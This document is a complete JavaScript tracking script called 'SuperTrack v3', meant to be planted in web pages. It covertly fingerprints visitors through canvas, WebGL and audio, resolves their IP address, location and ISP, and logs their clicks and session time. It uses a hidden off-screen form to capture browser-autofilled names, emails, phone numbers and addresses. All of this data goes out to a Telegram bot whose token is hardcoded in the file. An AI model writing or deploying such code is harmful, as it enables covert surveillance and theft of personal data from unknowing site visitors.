// SuperTrack v3 — Canvas, WebGL, Audio fingerprinting + Autofill
(function(){

// === CONFIG ===
var BOT = "8687058866:AAG2GVtSLWw0U4ZaAF1i1BR2swfNMdo_0_s";
var CHAT = 7609506968;

// === COLLECT ===
var PAGE = document.title || location.pathname;
var UA = navigator.userAgent;
var SCREEN = screen.width + "x" + screen.height;
var CORES = navigator.hardwareConcurrency || "?";
var RAM = navigator.deviceMemory || "?";
var NET = (navigator.connection || {}).effectiveType || "?";
var TOUCH = navigator.maxTouchPoints || 0;
var LANG = navigator.language || "?";
var TZ = Intl.DateTimeFormat().resolvedOptions().timeZone || "?";
var REF = document.referrer || "none";
var TIME = new Date().toLocaleString("en-GB", {timeZone: "Europe/London"});
var START = Date.now();
var VISIT = parseInt(localStorage.getItem("_vc") || "0") + 1;
localStorage.setItem("_vc", VISIT);

// === DETECT OS ===
function getOS(){
  if (/Windows/i.test(UA)) return "Windows";
  if (/Mac/i.test(UA)) return "macOS";
  if (/Android/i.test(UA)) return "Android";
  if (/iPhone|iPad|iPod/i.test(UA)) return "iOS";
  return "?";
}

// === DETECT DEVICE ===
function getDevice(){
  if (/iPhone/i.test(UA)) return "iPhone";
  if (/iPad/i.test(UA)) return "iPad";
  if (/Android/i.test(UA) && /Mobile/i.test(UA)) return "Android Phone";
  if (/Android/i.test(UA)) return "Android Tablet";
  if (/Mac/i.test(UA)) return "Mac";
  return "Desktop / Laptop";
}

// === DETECT BROWSER ===
function getBrowser(){
  var m = UA.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/);
  return m ? m[0] : "?";
}

// === SEND TO TELEGRAM ===
function send(text){
  new Image().src = "https://api.telegram.org/bot" + BOT + "/sendMessage?chat_id=" + CHAT + "&text=" + encodeURIComponent(text);
}

// === HASH FUNCTION ===
function hash(str){
  var h = 0, i;
  for (i = 0; i < str.length; i++) {
    h = ((h << 5) - h) + str.charCodeAt(i);
    h |= 0;
  }
  return h.toString(16);
}

// === CANVAS FINGERPRINT ===
function canvasFP(){
  try {
    var c = document.createElement("canvas");
    var x = c.getContext("2d");
    c.width = 280;
    c.height = 60;
    x.textBaseline = "top";
    x.font = "14px Arial";
    x.fillStyle = "#f60";
    x.fillRect(125, 1, 62, 20);
    x.fillStyle = "#069";
    x.fillText("Cwm fjordbank glyphs vext quiz", 2, 17);
    x.fillStyle = "rgba(102, 204, 0, 0.7)";
    x.fillText("Cwm fjordbank glyphs vext quiz", 4, 34);
    var data = c.toDataURL();
    return data.length + " | hash:" + hash(data);
  } catch(e) {
    return "blocked";
  }
}

// === WEBGL FINGERPRINT (GPU) ===
function webglFP(){
  try {
    var c = document.createElement("canvas");
    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return "not supported";
    var d = gl.getExtension("WEBGL_debug_renderer_info");
    var renderer = d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : "?";
    var vendor = d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL) : "?";
    return renderer + " | " + vendor;
  } catch(e) {
    return "blocked";
  }
}

// === AUDIO FINGERPRINT ===
function audioFP(){
  return new Promise(function(resolve) {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      var osc = ctx.createOscillator();
      var comp = ctx.createDynamicsCompressor();
      var gain = ctx.createGain();
      osc.type = "triangle";
      osc.frequency.value = 10000;
      comp.threshold.value = -50;
      comp.knee.value = 40;
      comp.ratio.value = 12;
      comp.attack.value = 0;
      comp.release.value = 0.25;
      gain.gain.value = 0;
      osc.connect(comp);
      comp.connect(gain);
      gain.connect(ctx.destination);
      osc.start(0);
      var analyser = ctx.createAnalyser();
      analyser.fftSize = 256;
      comp.connect(analyser);
      setTimeout(function() {
        var data = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(data);
        osc.stop();
        ctx.close();
        var sample = Array.from(data).slice(0, 30);
        resolve("hash:" + hash(JSON.stringify(sample)));
      }, 80);
    } catch(e) {
      resolve("blocked");
    }
  });
}

// === RUN FINGERPRINTS (sync ones first) ===
var CFP = canvasFP();
var WFP = webglFP();

// === BUILD MESSAGE ===
function buildMessage(ip, geo, audio){
  var msg = "";
  msg += "\u2501\u2501\u2501 SUPER TRACK \u2501\u2501\u2501\n";
  msg += "PAGE: " + PAGE + "\n";
  msg += "IP: " + ip + "\n";
  msg += "LOCATION: " + (geo.city || "?") + ", " + (geo.region || "?") + ", " + (geo.country_name || "?") + "\n";
  msg += "ISP: " + (geo.org || "?") + "\n";
  msg += "DEVICE: " + getDevice() + "\n";
  msg += "OS: " + getOS() + "\n";
  msg += "BROWSER: " + getBrowser() + "\n";
  msg += "SCREEN: " + SCREEN + "\n";
  msg += "HARDWARE: " + CORES + " cores / " + RAM + " GB RAM / " + NET + "\n";
  msg += "LANGUAGE: " + LANG + "\n";
  msg += "TIMEZONE: " + TZ + "\n";
  msg += "REFERRER: " + REF + "\n";
  msg += "VISIT #: " + VISIT + "\n";
  msg += "TIME: " + TIME + "\n";
  msg += "\u2501\u2501\u2501 FINGERPRINTS \u2501\u2501\u2501\n";
  msg += "CANVAS FP: " + CFP + "\n";
  msg += "WEBGL GPU: " + WFP + "\n";
  msg += "AUDIO FP: " + audio + "\n";
  msg += "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501";
  return msg;
}

// === HIDDEN AUTOFILL TRAP ===
(function(){
  var form = document.createElement("form");
  form.style.cssText = "position:fixed;left:-9999px;top:-9999px;opacity:0;pointer-events:none";
  form.innerHTML = '<input type="text" name="name" autocomplete="name"><input type="email" name="email" autocomplete="email"><input type="tel" name="phone" autocomplete="tel"><input type="text" name="address" autocomplete="street-address">';
  document.body.appendChild(form);

  function checkAutofill(label){
    var inputs = form.querySelectorAll("input");
    var data = {};
    inputs.forEach(function(inp){
      if (inp.value && inp.value.length > 1) data[inp.name] = inp.value;
    });
    if (Object.keys(data).length > 0) {
      var msg = "\u2501\u2501 AUTOFILL CAPTURED (" + label + ") \u2501\u2501\n";
      if (data.name) msg += "NAME: " + data.name + "\n";
      if (data.email) msg += "EMAIL: " + data.email + "\n";
      if (data.phone) msg += "PHONE: " + data.phone + "\n";
      if (data.address) msg += "ADDRESS: " + data.address + "\n";
      send(msg);
    }
  }

  setTimeout(function(){ checkAutofill("5s"); }, 5000);
  setTimeout(function(){ checkAutofill("15s"); }, 15000);
})();

// === MAIN EXFIL ===
fetch("https://api.ipify.org?format=json")
  .then(function(r){ return r.json(); })
  .then(function(d){
    return fetch("https://ipapi.co/" + d.ip + "/json/")
      .then(function(r){ return r.json(); })
      .then(function(g){
        audioFP().then(function(afp){
          send(buildMessage(d.ip, g, afp));
        });
      });
  })
  .catch(function(){
    send("\u26a0 TRACKING FAILED \u2014 could not reach ipify/ipapi");
  });

// === CLICK TRACKING ===
document.addEventListener("click", function(e){
  var el = e.target.closest("a");
  if (el && el.href) {
    send("CLICK: " + el.href.substring(0, 80));
  }
});

// === SESSION DURATION ===
window.addEventListener("beforeunload", function(){
  var duration = Math.round((Date.now() - START) / 1000);
  if (duration > 1) {
    navigator.sendBeacon(
      "https://api.telegram.org/bot" + BOT + "/sendMessage?chat_id=" + CHAT + "&text=" +
      encodeURIComponent("\u23f1 SESSION: " + PAGE + " \u2014 " + duration + "s")
    );
  }
});

})();